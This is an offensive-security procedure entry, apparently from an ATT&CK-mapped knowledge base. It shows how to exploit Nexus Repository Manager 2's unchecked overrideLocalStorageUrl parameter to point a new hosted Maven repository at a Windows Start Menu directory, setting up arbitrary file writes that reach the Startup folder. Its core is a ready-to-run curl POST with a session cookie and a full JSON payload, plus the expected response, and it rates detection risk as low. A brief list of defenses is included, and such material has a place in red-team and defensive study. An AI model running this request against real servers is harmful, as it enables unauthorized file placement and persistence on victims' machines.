---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - nexus
  - file-upload
  - arbitrary-path
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-create-custom-repo]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T05:32:10.454Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path

## Summary

This procedure exploits the lack of validation in Nexus Repository Manager's repository creation endpoint to set an arbitrary overrideLocalStorageUrl, allowing subsequent file uploads to sensitive filesystem locations on Windows.

## Description

In Nexus Repository Manager 2, authenticated admins can create hosted repositories via the REST API. The overrideLocalStorageUrl parameter accepts unchecked 'file:' URLs, enabling pointing to any writable path, such as Windows user directories. This sets up the foundation for arbitrary file writes without path traversal checks, targeting versions like OSS 2.14.9-01 running on Windows with SYSTEM privileges. Prerequisites include admin access and knowledge of target paths (e.g., Start Menu for Startup access).

## Requirements

1. Valid admin session cookie (NXSESSIONID) for Nexus
2. Access to the Nexus web service on port 8081
3. Target Windows path knowledge (e.g., C:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize overrideLocalStorageUrl to restrict to Nexus data directory
- Run Nexus with least-privilege user instead of SYSTEM on Windows
- Monitor API logs for suspicious 'file:' URLs in repository creation requests

## Objectives

1. Create a custom hosted Maven2 repository
2. Override storage to a sensitive path two levels above target (e.g., for Startup)
3. Enable arbitrary file placement in subsequent uploads

## Instructions

### Step 1: Prepare Repository Payload

**Context**: Construct JSON payload specifying hosted repo with custom storage URL pointing to Start Menu (to reach Programs/Startup via artifact params).

**Command** ([[commands/curl-create-custom-repo]]):
```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -d '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}'
```

> This sends a POST to /nexus/service/local/repositories, creating repo ID 5000 with storage overridden to the specified path. Expected output: HTTP 201 with JSON like {"data": {"id": "5000", "defaultLocalStorageUrl": "file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu"}}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-create-custom-repo]]

## Tools Used


## Tags

- nexus
- file-upload
- arbitrary-path
